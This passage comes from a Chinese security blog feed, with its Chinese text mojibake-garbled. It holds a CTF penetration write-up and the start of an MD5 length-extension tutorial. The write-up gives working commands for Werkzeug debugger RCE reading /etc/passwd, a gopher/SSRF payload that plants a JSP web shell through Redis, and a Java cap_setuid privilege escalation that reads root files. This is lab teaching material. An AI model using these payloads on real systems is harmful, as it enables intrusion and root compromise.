class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b &quot;__wzdc58fd521ffb0cae53209=1737707116|910ebc3905cd&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/jwk.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163537697.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163641184.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äº”ç« "><a href="#ç¬¬äº”ç« " class="headerlink" title="ç¬¬äº”ç« "></a>ç¬¬äº”ç« </h2><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102184258603.png" class="" title="This is an example image"><p>æ‰«åˆ°ä¸€ä¸ªjavaæœåŠ¡ã€‚jettyï¼Œæ²¡ä»€ä¹ˆå…¶ä»–çš„ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨ç‰ˆæœ¬æ¼æ´ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185318086.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185324743.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow_2025</span><br></pre></td></tr></table></figure><p>CVE-2021-28164</p><p><strong>æäº¤ &#x2F;dylan.txt ä¸­çš„key</strong></p><p>æ—¢ç„¶æˆ‘ä»¬è·å¾—äº†redisçš„å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥ç™»å½•redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.2.229.7:6380/auth:ctfshow_2025</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124164152106.png" class="" title="This is an example image"><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250108131824159-136678188.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename hack.jsp</span><br><span class="line">set xxx &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher://172.2.95.7:6380/_auth%20ctfshow_2025%0aconfig%20set%20dir%20%2fopt%2fjetty%2fwebapps%2fROOT%2f%0aconfig%20set%20dbfilename%20hack.jsp%0aset%20xxx%20%22%3c%25%20Runtime.getRuntime().exec(new%20String%5b%5d%7b%5c%22sh%5c%22%2c%5c%22-c%5c%22%2crequest.getParameter(%5c%22cmd%5c%22)%7d)%3b%25%3e%22%0asave%0aquit&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165521240.png" class="" title="This is an example image"><p>ä¸å‡ºæ„å¤–å†™é©¬æ˜¯æˆåŠŸçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165632050.png" class="" title="This is an example image"><p>ç„¶åå»è®¿é—®1.txtå³å¯ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165700581.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b11a7ae330883cb5bf667a9c1604635</span><br></pre></td></tr></table></figure><p><strong>æäº¤&#x2F;root&#x2F;message.txtä¸­æåˆ°çš„ç½‘å€</strong></p><p>ä¸€çœ¼éœ€è¦ææƒï¼</p><p>åˆ—å‡ºæ–‡ä»¶èƒ½åŠ›ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt; /opt/jetty/webapps/ROOT/cap.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124170452149.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>å¥½ä¸œè¥¿ï¼Œjavaæœ‰setuidèƒ½åŠ›</p><p>å†™å…¥ SetUID.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">//1111111111122</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) &#123;</span><br><span class="line">    return setuid(uid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#ä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œè¦æ³¨é‡Šä¸€è¡Œæ‰è¡Œï¼Œï¼Œï¼Œ</span><br></pre></td></tr></table></figure><p>å†™å…¥SetUID.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘SetUID.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘SetUID.java</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=javac%<span class="number">20</span>/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>rootæ‰§è¡Œå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=java%<span class="number">20</span>-Djava.library.path=/opt/jetty/webapps/ROOT/%<span class="number">20</span>-cp%<span class="number">20</span>/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–rootä¸‹é¢çš„txtæ–‡ä»¶</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124172301657.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashé•¿åº¦æ‹“å±•æ”»å‡»</title>
      <link href="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Hashé•¿åº¦æ‹“å±•æ”»å‡»"><a href="#Hashé•¿åº¦æ‹“å±•æ”»å‡»" class="headerlink" title="Hashé•¿åº¦æ‹“å±•æ”»å‡»"></a>Hashé•¿åº¦æ‹“å±•æ”»å‡»</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p><a href="https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki=oQet6QHW4D#toc-1">https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki%3DoQet6QHW4D#toc-1</a></p><p><a href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80</a></p></blockquote><p>hashé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œæ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ç”±äºhashçš„ç”Ÿæˆæœºåˆ¶ä½¿å¾—æˆ‘ä»¬å¯ä»¥äººä¸ºçš„åœ¨åŸå…ˆçš„æ˜æ–‡åŸºç¡€ä¸Šæ·»åŠ æ–°çš„æ‹“å±•å­—ç¬¦ï¼Œä»è€Œä½¿å¾—åŸæœ¬çš„åŠ å¯†é“¾å˜é•¿ï¼Œè¿›ä¸€æ­¥æ§åˆ¶åŠ å¯†é“¾çš„æœ€åä¸€èŠ‚ï¼Œä½¿å¾—æˆ‘ä»¬å¾—ä»¥æ§åˆ¶æœ€ç»ˆçš„ç»“æœã€‚</p><p>è¿™é‡Œé¦–å…ˆç»™å‡ºä¸€ä¸ªç›¸å…³demoï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxxä¸ºæœªçŸ¥å†…å®¹ï¼Œä½†é•¿åº¦å·²çŸ¥ä¸º6ã€‚</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">#token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾—å˜é‡<code>$token</code>ä¸æˆ‘ä»¬è¾“å…¥çš„signå‚æ•°æ»¡è¶³ä¸€è‡´æ‰ä¼šè¾“å‡ºflagã€‚</p><p>è€Œç”±äºæˆ‘ä»¬æ— æ³•çŸ¥é“å˜é‡<code>$secretKey</code>çš„å†…å®¹ï¼Œæ‰€ä»¥æ— æ³•å¾—åˆ°<code>$token</code>çš„å€¼ï¼Œæ•…è€Œçœ‹ä¼¼æ˜¯æ²¡æœ‰åŠæ³•è·å–åˆ°flagçš„æ­»å±€ï¼Œè€Œè¿™æ—¶ä¾¿è½®åˆ°æˆ‘ä»¬çš„æ‹“å±•æ”»å‡»æ¥å¤§æ˜¾èº«æ‰‹äº†ã€‚</p><h2 id="md5ç®—æ³•è¿‡ç¨‹"><a href="#md5ç®—æ³•è¿‡ç¨‹" class="headerlink" title="md5ç®—æ³•è¿‡ç¨‹"></a>md5ç®—æ³•è¿‡ç¨‹</h2><img src="https://img.0x002.com/article/hashLengthExtensionHack/20180813125243-b731fe76-9eb4-1.png" alt="MD5åŠ å¯†æµç¨‹" style="zoom:80%;" /><p>md5ç®—æ³•æ˜¯512ä½ä¸€ç»„çš„ï¼Œä¹Ÿå°±æ˜¯64å­—èŠ‚ä¸€ç»„ï¼Œè§ä¸‹é¢çš„ä¾‹å­ï¼š</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092231452.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç”±64ä¸ªaå’Œ3ä¸ªbç»„æˆï¼Œè¿™é‡Œçš„64ä¸ªaå…¶äºŒè¿›åˆ¶é•¿åº¦ä¸º512ä½ï¼Œå·²ç»ç¬¦åˆä¸€ä¸ªmd5åˆ†ç»„ï¼Œåé¢çš„bbbæ˜¯ä¸‹ä¸€ä¸ªåˆ†ç»„äº†ã€‚</p><blockquote><p>å¯¹äºmd5ç®—æ³•ï¼Œæˆ‘ä»¬éœ€è¦å°†åŸå§‹æ•°æ®åˆ†å—å¤„ç†ï¼Œä»¥512ä¸ªäºŒè¿›åˆ¶æ•°æ®ä¸ºä¸€å—ã€‚â€æœ€åâ€œä¸€å—çš„å¤„ç†åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ul><li>æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶æ•°æ®é•¿åº¦&lt;&#x3D;448ï¼Œå¡«å……padding(æ— æ„ä¹‰å ä½)æ•°æ®ä½¿å…¶é•¿åº¦ä¸º448ï¼Œå†æ·»åŠ åŸå§‹æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯ï¼ˆ64ä½ï¼‰ä½¿å…¶é•¿åº¦ä¸º512ä½å³å¯ã€‚</li><li>448&lt;æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶æ•°æ®é•¿åº¦&lt;&#x3D;512ï¼Œå¡«å……paddingæ•°æ®è‡³ä¸‹ä¸€å—çš„448ä½ï¼Œè€Œåå†æ·»åŠ åŸå§‹æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯ï¼ˆ64ä½ï¼‰ä½¿å…¶é•¿åº¦ä¸º512ä½å³å¯ã€‚</li></ul></blockquote><p><strong>æƒ…å†µä¸€ï¼š</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092526249.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092538591.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¿™é‡Œå…¶å®64ä¸ªå­—ç¬¦aç»„æˆäº†ä¸€ä¸ªmd5åˆ†ç»„ï¼Œå‰©ä¸‹çš„32ä¸ªå­—ç¬¦bä½œä¸ºä¸‹ä¸€ä¸ªmd5åˆ†ç»„ï¼Œç„¶åéœ€è¦è¿›è¡Œå¡«å……ã€‚</p><p>è¿›è¡Œå¡«å……çš„æ–¹å¼å°±æ˜¯åœ¨äºŒè¿›åˆ¶ä¸‹ç¬¬ä¸€ä¸ªè¡¥1ï¼Œåé¢çš„ä¾æ¬¡è¡¥0 ã€‚ä½†æ˜¯åœ¨è¿™é‡Œå’±ä»¬æ˜¯ä»¥åå…­è¿›åˆ¶å½¢å¼åœ¨010é‡Œæ¼”ç¤ºçš„ï¼Œè€Œå¯¹äºåå…­è¿›åˆ¶æ¥è¯´ï¼Œä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦å¯¹åº”4ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ï¼Œæ‰€ä»¥å¯¹äº010é‡Œé¢æ•°æ®æ¥è¯´ï¼Œ10000000(2)&#x3D;&#x3D;80(16)ï¼Œè¡¥å……ä¸Šå»å°±æ˜¯ï¼š</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092858007.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç„¶ååé¢ä¾æ¬¡è¡¥0ï¼ŒçŸ¥é“å¡«æ»¡448ä½ä¸ºæ­¢ï¼Œå¾—åˆ°æœ€ç»ˆè¡¥ä½ç»“æœä¸ºï¼š</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104093536746.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç„¶åè¿˜éœ€è¦è¡¥ä½8ä¸ªå­—èŠ‚ï¼ŒåŸå§‹æ˜æ–‡ä¸º64ä¸ªaå’Œ32ä¸ªbï¼Œå…±96ä¸ªå­—ç¬¦ï¼Œ768ä½ï¼Œè½¬æ¢ä¸ºåå…­è¿›åˆ¶å°±æ˜¯300ã€‚</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094147690.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p><strong>æƒ…å†µäºŒï¼š</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094227950.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094235021.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¡¥ä½å°±ä¸å±•ç¤ºäº†ï¼Œè·Ÿä¸Šé¢çš„æƒ…å†µä¸€æ˜¯åŒç†çš„ã€‚</p><p>å¯¹äºMD5ç®—æ³•æ¥è¯´ï¼Œæœ‰ä¸€ä¸²åˆå§‹å‘é‡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>è¿™ä¸²åˆå§‹å‘é‡çš„å€¼æ˜¯å›ºå®šçš„ï¼Œä½œä¸ºä¸ç¬¬ä¸€å—æ•°æ®è¿ç®—çš„åŸå§‹å‘é‡ã€‚</p><p>å½“è¿™ä¸²å‘é‡ä¸ç¬¬ä¸€å—æ•°æ®å—è¿ç®—ä¹‹åï¼Œå¾—åˆ°äº†ä¸€ä¸²æ–°çš„å‘é‡å€¼ï¼Œè¿™ä¸²æ–°çš„å‘é‡å€¼æ¥ç€ä¸ç¬¬äºŒå—æ•°æ®å—å‚åŠ è¿ç®—ï¼Œç›´åˆ°æœ€åä¸€å—æ•°æ®å—ã€‚</p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906234219.png" alt="å‘é‡è¿ç®—" style="zoom:67%;" /><p>è€Œæœ€åçš„MD5å€¼å°±æ˜¯è¿™æœ€åçš„å‘é‡ä¸²ç»è¿‡å¦‚ä¸‹è½¬æ¢çš„ç»“æœã€‚</p><p>å¦‚å‘é‡ä¸²ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0xab45bc01</span><br><span class="line">B=0x6a64bb53</span><br><span class="line">C=0x23ba8afe</span><br><span class="line">D=0x46847a62</span><br></pre></td></tr></table></figure><p>å†è¿›è¡Œé«˜ä½ä½äº’æ¢ï¼Œå¾—åˆ°å¦‚ä¸‹æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br><span class="line">fe 8a ba 23</span><br><span class="line">62 7a 84 46</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‹¼æ¥å¾—åˆ°MD5å€¼ï¼š<code>01bc45ab53bb646afe8aba23627a8446</code>ã€‚</p><h3 id="å›é¦–demo"><a href="#å›é¦–demo" class="headerlink" title="å›é¦–demo"></a>å›é¦–demo</h3><p>ç„¶åå›åˆ°å…ˆå‰é‚£ä¸ªä¾‹å­ï¼š</p><p>å¯¹äºMD5å€¼ï¼š<code>2df51a84abc64a28740d6d2ae8cd7b16</code>ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®MD5ä¸å‘é‡äº’è½¬è§„åˆ™ï¼Œå°†MD5è½¬æˆ<code>md5($secretKey + &quot;test&quot;)</code>çš„æœ€ç»ˆå‘é‡å€¼ï¼ˆAâ€™ã€Bâ€™ã€Câ€™ã€Dâ€™ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x27;=0x841af52d</span><br><span class="line">B&#x27;=0x284ac6ab</span><br><span class="line">C&#x27;=0x2a6d0d74</span><br><span class="line">D&#x27;=0x167bcde8</span><br></pre></td></tr></table></figure><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907000504.png" alt="ä¾‹å­å‘é‡è¿ç®—è¿‡ç¨‹" style="zoom:80%;" /><p>è¿™æ—¶å€™æˆ‘ä»¬ä¿®æ”¹<code>$v1</code>å˜é‡çš„å†…å®¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;</span><br><span class="line">ç›¸å½“äº:</span><br><span class="line">&quot;test&quot; + paddingæ•°æ® + é•¿åº¦æ•°æ® + &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>åˆ™ä¸Šè¿°è¿‡ç¨‹åˆ™è¢«å»¶ç»­æˆä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907002411.png" alt="å»¶ç»­è¿ç®—è¿‡ç¨‹"></p><p>è€Œå¯¹äºä¸Šè¿°è¿ç®—è¿‡ç¨‹æ¥è¯´ï¼Œæˆ‘ä»¬çŸ¥é“äº†å€’æ•°ç¬¬äºŒä¸ªå‘é‡ä¸²çš„å†…å®¹å’Œæœ€åä¸€ä¸ªæ•°æ®å—ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæœ€ç»ˆçš„MD5å€¼æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±é€šè¿‡MD5ç®—æ³•è®¡ç®—å‡ºæ¥äº†ã€‚</p><h2 id="åˆ©ç”¨å·¥å…·exploit"><a href="#åˆ©ç”¨å·¥å…·exploit" class="headerlink" 